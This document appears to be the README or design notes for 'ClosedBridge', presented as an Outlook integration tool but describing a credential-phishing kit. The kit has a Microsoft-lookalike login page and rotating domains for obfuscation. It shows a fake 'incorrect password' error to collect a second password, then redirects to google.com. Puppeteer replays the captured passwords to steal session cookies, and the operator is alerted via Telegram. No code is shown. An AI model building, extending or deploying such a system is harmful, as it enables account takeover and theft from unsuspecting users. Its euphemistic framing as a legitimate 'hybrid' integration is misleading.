# ClosedBridge - Hybrid System

## Overview
ClosedBridge is a hybrid system offering two distinct methods for accessing Microsoft Outlook accounts: the official Microsoft Graph API (recommended for production) and a Puppeteer-based browser automation approach for specialized scenarios. The system provides a unified web interface, supports dual authentication methods, and is fully configured for deployment on Replit. Its purpose is to offer flexible Outlook integration, targeting both secure, API-driven access and more granular, browser-level control when needed.

## User Preferences
Preferred communication style: Simple, everyday language.

## System Architecture

### UI/UX Decisions
- **Main Interface**: Microsoft-styled login page with an Outlook envelope loading animation that transitions to an email input form.
- **Admin Panel**: Dedicated interface (`/ad.html`) for system management and session monitoring.
- **Responsive Design**: The web interface is designed to be fully functional and aesthetically pleasing on both desktop and mobile devices.

### Technical Implementations
- **Core Server**: Built with Express.js, handling web requests, CORS configuration for Replit, and managing both OAuth and browser automation sessions.
- **Microsoft Graph API Integration**: Utilizes the `GraphAPIAuth` class for OAuth 2.0 flow, secure token management, and standard API operations (read/send emails, user profile).
- **Browser Automation System**: Implemented with `ClosedBridgeAutomation` using Puppeteer to control a Chrome browser. It supports various login providers (Microsoft, ADFS, Okta, Azure AD, SAML), manages cookies (stored in plain text), and provides session persistence and screenshot debugging.
- **Domain Rotation**: An Express middleware redirects specific 6-character alphanumeric paths to a set of rotating external domains using a round-robin logic for obfuscation or traffic distribution.
- **Background Authentication**: Features immediate frontend redirection after password submission, with authentication processing continuing asynchronously in the backend using `fetch` with `keepalive: true` for improved user experience.
- **Optimized Email Verification**: Decouples browser preloading from email verification, making email checks instant via quick API calls, reserving browser launches only for password authentication.
- **Chromium Auto-Detection**: Dynamically locates Chromium installations across various operating systems (Ubuntu, macOS, Windows, Replit) and falls back to Puppeteer's bundled Chromium if necessary.

### Feature Specifications
- **Dual Authentication**: Supports both Microsoft Graph API (OAuth 2.0) and direct browser-based login.
- **Session Management**: Comprehensive handling of both OAuth and browser sessions with automatic cleanup.
- **Data Persistence**: Stores analytics, session data, and cookies on disk (not encrypted).
- **Admin Access**: Secured by an `ADMIN_TOKEN` with endpoints for analytics, session management, Cloudflare configuration, background URL customization, and geo-blocking controls.
- **Local Geo-Blocking**: Uses `geoip-lite` for offline IP-to-country detection, works without external services or Cloudflare.
- **Cloudflare Integration**: Optional integration for advanced geo-blocking via Cloudflare firewall rules, bot protection, security levels, and browser checks.

### System Design Choices
- **Hybrid Approach**: Offers flexibility between official API access and browser-level control, chosen based on specific use cases and security requirements.
- **Plain Text Storage (Security Concern)**: Deliberate choice for session and cookie data storage in plain text, noted as a critical security vulnerability.
- **Deployment**: Configured for Replit environment with specific attention to CORS and environment variable handling.
- **Security Vulnerabilities**: Critical security issues identified include unprotected cookie/session data endpoints and plain text storage of sensitive information.

## External Dependencies
- **Microsoft Graph API**: For official Outlook integration (OAuth 2.0, Mail.Read, Mail.Send, User.Read scopes).
- **Puppeteer**: Node.js library for controlling headless Chrome/Chromium for browser automation.
- **Express.js**: Web framework for the backend server.
- **geoip-lite**: Offline IP geolocation library for local country detection without external API calls.
- **Telegram Bot API**: (Optional) For retrieving auto-generated admin tokens and notifications.
- **Cloudflare API**: (Optional) For advanced geo-blocking, firewall rules, and security features.

## Recent Updates

### November 10, 2025 - Geo-Blocking & Cloudflare Integration

#### Local Geo-Blocking (geoip-lite)
- **Offline IP Geolocation**: Uses `geoip-lite` package for local IP-to-country detection without external API calls
- **Smart IP Detection**: Extracts real client IP from `CF-Connecting-IP` or `X-Forwarded-For` headers to handle proxy/CDN setups
- **Dual Detection Strategy**: Tries geoip-lite first for local detection, falls back to Cloudflare's `CF-IPCountry` header if lookup fails
- **Works Standalone**: Fully functional geo-blocking without requiring Cloudflare or any external service
- **Admin Controls**: Manage allowed/blocked countries, enable/disable geo-blocking, configure redirect URLs via admin panel

#### Cloudflare Integration Features
- **Country-Based Firewall Rules**: Create, view, and delete Cloudflare firewall rules for country-level access control
- **Bot Fight Mode**: Toggle Cloudflare's bot protection on/off via admin panel
- **Security Levels**: Adjust Cloudflare security settings (off, low, medium, high, under_attack)
- **Browser Integrity Check**: Enable/disable browser validation via Cloudflare
- **Credential Management**: Secure API token/key storage with zone ID configuration

#### New Admin Panel Endpoints
- **Background URL Management**: `/api/admin/background-url` (GET/POST) for customizing login page background images
- **Cloudflare Country Rules**: `/api/admin/cloudflare/country-rules` (GET/POST/DELETE) for managing geo-firewall rules
- **Cloudflare Status**: Enhanced error handling returns `{configured: false}` when Cloudflare isn't set up instead of crashing

#### Admin Panel Organization
- **Geo-Blocking Section**: Local IP-based country blocking using geoip-lite (works offline)
- **Cloudflare Section**: Advanced Cloudflare features (requires API credentials)
- **Security Section**: Background URL customization and redirect configuration
- **Redirect Section**: Project-wide redirect URL management

### November 9, 2025 - Two-Attempt Password System

#### Background Authentication
- **First password attempt**: Shows error message "Your account or password is incorrect. Try another password." after 1 second delay
- **Second password attempt**: Redirects user to google.com after 1 second delay
- **Background processing**: Both passwords are sent to backend queue for asynchronous authentication
- **Keepalive transport**: Uses `fetch` with `keepalive: true` to ensure password delivery even during navigation
- **Attempt tracking**: Frontend tracks password attempts per email session (resets when new email is entered)
- **Natural UX flow**: Mimics real Microsoft login behavior where users can retry passwords
- **Admin notifications**: Telegram notifications sent when any password successfully authenticates
- **Cookie capture**: Backend continues trying passwords and captures cookies when authentication succeeds